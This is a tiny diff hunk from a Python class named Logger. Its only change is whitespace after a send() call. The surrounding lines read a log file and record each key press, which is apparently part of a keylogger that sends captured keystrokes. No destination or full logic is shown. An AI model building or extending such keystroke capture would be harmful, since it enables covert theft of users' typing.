@@ -13,7 +13,7 @@ class Logger:
         with open("log.txt","r",encoding="utf-8") as f:
             data = f.read()
             if len(data) > 0:
-                self.send()    
+                self.send()   
 
     def on_press(self,key):
         self.chars.append(key)
